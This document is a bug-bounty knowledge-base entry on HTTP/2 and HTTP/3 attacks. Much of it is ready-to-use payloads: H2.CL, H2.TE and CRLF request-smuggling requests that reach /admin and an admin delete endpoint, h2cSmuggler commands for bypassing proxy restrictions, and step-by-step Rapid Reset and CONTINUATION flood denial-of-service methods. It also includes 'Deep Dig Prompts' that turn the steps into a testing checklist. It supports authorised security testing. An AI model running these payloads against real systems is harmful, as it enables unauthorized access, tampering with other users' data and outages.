---
id: "http2-attacks"
title: "HTTP/2 & HTTP/3 Specific Attacks"
type: "technique"
category: "web-application"
subcategory: "http2"
tags: ["http2", "http3", "h2c", "smuggling", "desync", "reset-flood", "hpack", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["http-request-smuggling", "cache-poisoning"]
difficulty: "expert"
updated: "2026-04-14"
---

# HTTP/2 & HTTP/3 Specific Attacks

## Why HTTP/2 Bugs Are Valuable
HTTP/2 is everywhere but poorly understood. Proxy/server mismatches in HTTP/2 handling create smuggling, desync, and bypass opportunities that HTTP/1.1 testing misses. Bounties: $5k–$50k+.

## HTTP/2 Request Smuggling

### H2.CL (HTTP/2 → HTTP/1.1 Content-Length)
```
# Front-end speaks HTTP/2, back-end speaks HTTP/1.1
# HTTP/2 doesn't use Content-Length — but back-end does
# Inject a Content-Length header that disagrees with actual body

# Using h2cSmuggler or custom HTTP/2 client:
:method: POST
:path: /
:authority: target.com
content-length: 0    # ← HTTP/2 ignores this, but back-end trusts it

GET /admin HTTP/1.1
Host: target.com

# Back-end sees Content-Length: 0, treats "GET /admin" as next request
# This is CL.0 smuggling through HTTP/2
```

### H2.TE (HTTP/2 → Transfer-Encoding)
```
# HTTP/2 forbids Transfer-Encoding, but some proxies pass it through

:method: POST
:path: /
:authority: target.com
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

# Front-end (HTTP/2) ignores Transfer-Encoding
# Back-end (HTTP/1.1) processes chunked encoding
# Smuggled request hits /admin
```

### H2.0 (Zero Content-Length)
```
# Send POST with Content-Length: 0 but include a body
# HTTP/2 framing determines body length, CL is ignored
# Back-end using CL sees empty body + new request

:method: POST
:path: /api/search
:authority: target.com
content-length: 0

POST /api/admin/delete HTTP/1.1
Host: target.com
Content-Type: application/json

{"user_id": "victim"}
```

### Header Injection via CRLF in HTTP/2
```
# HTTP/2 pseudo-headers can contain CRLF characters
# Some proxies don't sanitize when downgrading to HTTP/1.1

:method: GET
:path: / HTTP/1.1\r\nHost: target.com\r\nX-Injected: true\r\n\r\nGET /admin
:authority: target.com

# When proxy converts to HTTP/1.1:
# GET / HTTP/1.1
# Host: target.com
# X-Injected: true
#
# GET /admin HTTP/1.1
```

## HTTP/2 Exclusive Vectors

### HPACK Header Compression Attacks
```
# HPACK uses dynamic tables shared across requests on same connection
# Information leak: timing differences reveal if headers match table entries

# Attack: Measure response time for different header values
# If header is already in HPACK table → faster compression → timing leak
# Similar to CRIME but for HTTP/2 headers

# Practical impact: Leak cookies or auth tokens character by character
# Mitigation: Most servers randomize HPACK table per connection
# But: Shared hosting/CDN may share tables across requests
```

### Stream Multiplexing Abuse
```
# HTTP/2 allows multiple requests on one connection (streams)
# Race conditions are easier — no need for multiple connections

# Single-connection race:
# Send 100 streams simultaneously on one TCP connection
# All streams processed in parallel by the server
# Bypass per-connection rate limits

# Stream priority manipulation:
# Set high priority on attack streams, low on others
# Server processes attack requests first
# Can cause DoS by starving legitimate requests
```

### HTTP/2 RST_STREAM Rapid Reset (CVE-2023-44487)
```
# Send request, immediately cancel with RST_STREAM
# Server allocates resources to process request
# But RST_STREAM frees the stream slot for a new one
# Result: Amplified resource consumption

# Testing (NOT for DoS — just to verify vulnerability):
# Use h2load or custom HTTP/2 client
# Send request + immediate RST_STREAM
# Check if server processes the request despite cancellation
# Indicators: server-side logs show processing, resource spike

# Bug bounty angle: Report as DoS vulnerability
# Demonstrate: server CPU/memory impact with small client bandwidth
```

### HTTP/2 CONTINUATION Flood
```
# CONTINUATION frames extend HEADERS beyond a single frame
# No limit on number of CONTINUATION frames in many implementations
# Send thousands of tiny CONTINUATION frames → exhaust server memory

# Testing approach:
# 1. Start HEADERS frame without END_HEADERS flag
# 2. Send CONTINUATION frames with 1 byte each
# 3. Server must buffer all frames until END_HEADERS
# 4. Memory grows linearly with frame count

# Impact: DoS with minimal bandwidth
# The server cannot process the request until all CONTINUATIONs arrive
```

### h2c Smuggling (HTTP/2 Cleartext Upgrade)
```
# h2c = HTTP/2 without TLS
# Some reverse proxies allow Upgrade: h2c
# This can bypass proxy restrictions

# Step 1: Upgrade connection to h2c
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
Connection: Upgrade, HTTP2-Settings
HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA

# Step 2: If proxy allows upgrade, you now have direct HTTP/2 to backend
# Proxy may not inspect HTTP/2 traffic → bypass WAF/ACLs

# h2cSmuggler tool:
python3 h2cSmuggler.py -x https://target.com/ \
  --test  # Check if h2c upgrade is allowed

python3 h2cSmuggler.py -x https://target.com/ \
  -X POST -d '{"admin": true}' \
  https://target.com/internal/admin
```

## HTTP/3 (QUIC) Specific
```
# HTTP/3 uses QUIC (UDP) instead of TCP
# Different parsing and handling → new smuggling vectors

# Testing HTTP/3 support:
curl --http3 https://target.com/ -v

# Potential vectors:
# 1. HTTP/3 → HTTP/1.1 downgrade smuggling (same concept as H2)
# 2. QUIC connection migration (roaming between IPs)
# 3. 0-RTT replay attacks (similar to TLS 0-RTT)
# 4. UDP-based amplification
# 5. Connection ID manipulation

# Most programs don't test HTTP/3 — low-hanging fruit if supported
# Check: alt-svc header in responses
# alt-svc: h3=":443"; ma=86400
```

## Testing Tools

### h2cSmuggler
```bash
# Test h2c upgrade smuggling
git clone https://github.com/BishopFox/h2cSmuggler
cd h2cSmuggler

# Test for h2c support:
python3 h2cSmuggler.py -x https://target.com/ --test

# Smuggle a request:
python3 h2cSmuggler.py -x https://target.com/ \
  https://target.com/admin
```

### Burp Suite HTTP/2
```
# Burp supports HTTP/2 natively
# Inspector tab → switch to HTTP/2
# Repeater → right-click → "Change request to HTTP/2"

# Key: Enable "Allow HTTP/2 CONNECT" in settings
# Use "HTTP Request Smuggler" extension for automated testing
```

### curl with HTTP/2
```bash
# Force HTTP/2:
curl --http2 https://target.com/ -v

# HTTP/2 prior knowledge (no upgrade):
curl --http2-prior-knowledge http://target.com/ -v

# Send custom pseudo-headers (requires nghttp2):
nghttp -v https://target.com/ \
  -H ':method: POST' \
  -H ':path: /admin' \
  -d 'data'
```

## Deep Dig Prompts
```
Given this target [describe]:
1. Check if HTTP/2 is supported (curl --http2 -v)
2. Check for h2c upgrade support
3. Test H2.CL and H2.TE smuggling via Burp HTTP/2
4. Look for CRLF injection in pseudo-headers
5. Test HTTP/3 support (alt-svc header) for untested attack surface
6. Check for RST_STREAM and CONTINUATION handling
```

## Key Signals
- `alt-svc` header in response (indicates HTTP/2 or HTTP/3)
- Mixed HTTP versions (proxy HTTP/2, backend HTTP/1.1)
- CDN/reverse proxy in front (Cloudflare, nginx, HAProxy)
- Connection upgrade headers in response
